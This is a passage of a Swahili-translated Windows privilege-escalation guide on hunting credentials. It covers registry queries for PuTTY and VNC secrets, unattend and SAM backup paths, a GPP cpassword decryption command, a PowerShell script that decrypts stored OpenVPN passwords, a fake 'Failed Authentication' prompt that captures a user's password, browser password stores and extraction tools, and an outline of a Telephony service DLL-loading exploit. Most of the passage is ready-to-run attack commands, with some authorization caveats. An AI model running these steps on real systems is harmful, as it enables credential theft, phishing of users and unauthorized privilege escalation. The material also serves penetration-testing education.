Usakinishaji wa Openfire unaotumia embedded database unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` na property ya `passwordKey` kwa pamoja. [Nyaraka za user-provider za Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema password zinaweza kuhifadhiwa kama plain text au kusimbwa kwa fiche kwa key iliyohifadhiwa kwenye property hiyo. Password iliyorejeshwa ni muhimu kwa escalation tu ikiwa bado ni halali kwa identity yenye ruhusa zaidi; jina la faili peke yake halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Path hiyo ni kidokezo cha inventory, kwa hivyo usijumuishe maudhui ya database na credentials katika matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua ports na bind interface zilizosanidiwa za admin console hata wakati database ya nje inatumika. Openfire mara nyingi hufunga admin console kwenye loopback; akaunti ya ndani bado inaweza kufikia anwani hiyo ikiwa listener inaendeshwa. Kagua listener halisi, jukumu la admin lililoidhinishwa, sera ya kupakia plugin, na identity ya Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha plugin code iendeshwe katika context ya service, ambayo inaweza kuwa na ruhusa kubwa ikiwa service inaendeshwa kama LocalSystem. Password inayolingana ya akaunti au path ya usanidi inayosomeka peke yake haithibitishi ufikiaji wa admin console au utekelezaji wa code. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa forensic management server

Usanidi wa Velociraptor server, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya internal CA. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma key hiyo, anaweza kutengeneza API client certificate. Ikiwa hilo litasababisha ruhusa za juu zaidi hutegemea roles za watumiaji wa server, ufikikaji wa API, na identity ambayo server au target agent inaendeshwa nayo. Client configuration huwa na material tofauti; kuipata hakuthibitishi ufikiaji wa server CA. Baadhi ya deployments huhifadhi private key ya CA nje ya mtandao, kwa hiyo huenda usanidi wa server unaosomeka usiwe na signing key.

Kwenye Windows server, kagua ACL ya usanidi wa **server** katika installation directory yake na nakala zozote za backup zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia path iliyosanidiwa ya service ikiwa ni tofauti. Thibitisha kuwa identity ya sasa inaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia CA key kutoa client certificate, lakini role inayotumika upande wa server pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji datastore write access au restart. Identity ya server yenye ruhusa za juu iliyopo tayari inaweza kutoa njia hata kama ruhusa hizo za kuandika hazipo. API queries zenye haki za execution huendeshwa katika context husika ya server au agent, ambayo inaweza kuwa na ruhusa kubwa.

Linda usanidi wa server na backups zake kwa ACL zenye vizuizi, hifadhi CA signing key nje ya mtandao inapowezekana, na punguza API roles na ufikiaji wa listener. Tazama [nyaraka za Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake ya asili iliyosimbwa kwa njia fiche inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa uhamishaji wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kuwa uhamishaji husimbwa kwa nenosiri na unaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi ya asili. Kwanza, kagua ruhusa za faili na njia zake. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kwamba credential yoyote iliyohifadhiwa bado ni halali au ina haki za juu zaidi.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys kwenye registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia ikiwa kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa SSH key iliyohifadhiwa. Limehifadhiwa kwa usimbaji fiche, lakini linaweza kusimbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha mfumo, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana kuwa mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa asymmetric key.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka pia zinaweza kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za nje ya mtandao. Kipaumbele kiwe saraka za backup au image zinazoweza kufikiwa ndani ya mfumo, na kagua **majina ya vipengee** vya image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na picha za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi huwa mwelekeo wa uongo. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya upeo wa kazi. Tazama mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Credentials za Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye akiba

Hapo awali kulikuwa na kipengele kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za kiusalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, manenosiri ndani ya GPP hizi, yaliyosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliochapishwa hadharani, yangeweza kusimbuliwa na mtumiaji yeyote aliyethibitishwa. Hili lilikuwa hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kuchanganua faili za GPP zilizohifadhiwa kwenye akiba ya ndani na zilizo na sehemu ya "cpassword" isiyo tupu. Faili kama hiyo ikipatikana, kazi hiyo husimbua nenosiri na kurudisha object maalum ya PowerShell. Object hii ina maelezo kuhusu GPP na eneo la faili, hivyo kusaidia kutambua na kurekebisha udhaifu huu wa kiusalama.

Tafuta faili hizi kwenye `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye taarifa za uthibitishaji:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za backup kwenye webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayotolewa inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumika tena. Kagua physical path iliyosanidiwa ya tovuti na kama kumbukumbu hiyo inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kama uvujaji. Path chaguomsingi `C:\inetpub\wwwroot` ni chaguo la kuangalia tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa bila kufungua kumbukumbu:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kuwa ina siri au kuwa credential iliyopatikana inatoa privilege ya juu.

### Credentials za OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza **kumwomba mtumiaji aweke credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzifahamu (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **passwords** kwa **maandishi wazi** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kama uwezekano wa kuwa vault iliyosimbwa; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua au kutumia credentials zozote zilizohifadhiwa. Unapokagua mahali faili hizo zimehifadhiwa, angalia profaili za watumiaji unazoweza kufikia na mizizi ya kushiriki faili iliyosanidiwa.

Faili ya KeePass `.kdbx` inayosomeka nayo ni kidokezo tu cha vault iliyosimbwa. Kuifungua kunahitaji master-password halisi na faili yoyote ya key au vipengele vya akaunti vilivyosanidiwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT kwenye ingizo, thibitisha akaunti iliyotajwa na kama NT hash hiyo bado ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault lenyewe halikupi haki za Administrator au SYSTEM; ufikiaji wa huduma ya mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia ziwepo. Orodhesha njia ya vault na kama inasomeka, lakini usichapishe hifadhidata au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Vitambulisho kwenye RecycleBin

Kagua vipengee vinavyoweza kufikiwa kwenye Recycle Bin ili kutafuta nakala za chelezo zilizofutwa na kumbukumbu za usanidi, pamoja na faili ambazo majina yake yanataja wazi vitambulisho. Nakala ya chelezo ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa katika rekodi ya `$I`, na faili iliyofutwa kama ingizo lake sambamba la `$R`; kagua metadata na ruhusa za kusoma za utambulisho wa sasa kabla ya kufungua kumbukumbu. Kinachoonekana hutegemea volume, SID ya mtumiaji na ruhusa za faili, kwa hiyo orodha tupu haithibitishi kuwa hakuna nakala ya chelezo inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama mgombea wa ukaguzi, si uthibitisho kwamba lina siri halali.

Faili ya `.pfx` iliyofutwa inayoweza kufikiwa inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell huhitaji cheti cha code-signing chenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker za publisher hutathmini utambulisho wa msaini na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti huhitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali sahihi inayotokana nayo kwa script na akaunti lengwa, na task iliyoratibiwa au programu nyingine yenye ruhusa za juu zaidi iendeshe script hiyo. Jina la faili la `.pfx`, mada ya cheti au script inayoweza kuandikwa pekee havithibitishi kuwa mnyororo huo upo. Kagua metadata, ACL, sera na amri iliyoratibiwa kabla ya kufungua nyenzo za private key au kuwasha task.

Pia kagua hifadhidata za wasifu wa messaging-client zinazoweza kufikiwa, madokezo na faili zilizopokelewa ili kutafuta vidokezo vya vitambulisho. Nakala ya urejeshaji ya BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala ya chelezo iliyopewa jina. Nyenzo hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche, yenye nakala za zamani za chelezo; kagua volume na kumbukumbu hiyo tu ikiwa umeidhinishwa. Ikiwa nakala ya chelezo ina `NTDS.dit`, kurejesha vitambulisho vya domain nje ya mtandao kunahitaji pia hive ya `SYSTEM` inayolingana, kama ilivyoelezwa kwenye [mchakato wa nakala za chelezo na privileged-groups](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna key ya urejeshaji inayoweza kutumika au nakala ya chelezo ya domain.

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Key nyingine zinazowezekana za registry zenye vitambulisho**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa funguo za openssh kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambako nywila za **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari ili kuona kama **nywila zimehifadhiwa** humo.

Kwa wasifu wa kawaida wa **Default** wa Edge wa mtumiaji wa sasa, `Login Data` iko katika `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa katika saraka yake kuu ya `User Data`. [Microsoft inaeleza mahali pa kawaida pa wasifu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); wasifu mwingine au sera ya `UserDataDir` inaweza kuuhamisha. Kuwepo kwa faili ni kidokezo tu cha mahali pa kuhifadhi vitambulisho: hakikisha faili zinaweza kusomeka, kuna muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine za ufunguo zilizoidhinishwa, na kwamba login iliyohifadhiwa ni ya akaunti yenye ruhusa za juu zaidi. Kuhesabu njia pekee hakuhitaji kufungua database wala kuchapisha nywila zilizofumbuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za wasifu ni faili zinazohusiana za ufunguo na login zilizosimbwa. Kuwepo kwake ni kidokezo tu: hakikisha faili zote mbili zinaweza kusomeka, kuna entries zilizohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kuwa vitambulisho vinaweza kutumika. Ikiwa kitambulisho kilichopatikana ni cha akaunti ya domain, kagua kando haki za udhibiti za kikundi zinazotumika kwa akaunti hiyo na haki za kikundi za [kusoma au kufumbua nywila ya LAPS](../active-directory-methodology/laps.md); mabaki ya kivinjari pekee hayathibitishi njia ya kupata ruhusa za msimamizi.

Tools za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)**, na kila kipengele hufichua utendaji kupitia interface moja au zaidi, zinazotambuliwa kwa interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child **InProcServer32**, iliyo na **default value** inayoelekeza kwenye **DLL**, na value inayoitwa **ThreadingModel**, ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata registry child InProcServer32, iliyo na default value inayoelekeza kwenye DLL na value...](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kupandisha marupurupu** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya kudumu, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa nywila kwenye faili na registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili kwa jina maalum**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya key na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyounda ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **majina ya watumiaji** na **nywila** za zana kadhaa zinazohifadhi data hii kama maandishi yasiyofichwa (PuTTY, WinSCP, FileZilla, SuperPuTTY na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria **process inayoendeshwa kama SYSTEM ifungue process mpya** (`OpenProcess()`) ikiwa na **full access**. Process hiyo hiyo **pia iunde process mpya** (`CreateProcess()`) **yenye privileges za chini lakini ikirithi handles zote zilizo wazi za process kuu**.\
Kisha, ukiwa na **full access kwa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu ili kupata maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles zaidi zilizo wazi za processes na threads zinazorithiwa zikiwa na viwango tofauti vya permissions (si full access pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachowezesha processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, wenye majukumu yanayofafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges** inayowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kujifanya kuwa process hiyo inapoingiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio hili, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo inaruhusu **kunasa mawasiliano ya named pipe kwa kutumia tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) ikiwa katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client ya mbali iliyothibitishwa inaweza kutumia vibaya njia ya matukio ya async inayotumia mailslot ili kubadilisha `ClientAttach` iwe **uandishi wa byte 4** kwa faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mchakato kamili:

- `ClientAttach` ikiwa na `pszDomainUser` iliyowekwa kuwa njia iliyopo inayoweza kuandikiwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kuandika matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` hadi kwenye handle hiyo. Sajili programu ya line kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata matukio kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima ili kurudia uandishi huo kwa namna inayotabirika.
- Jiongeze kwenye `[TapiAdministrators]` ndani ya `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiwa na njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
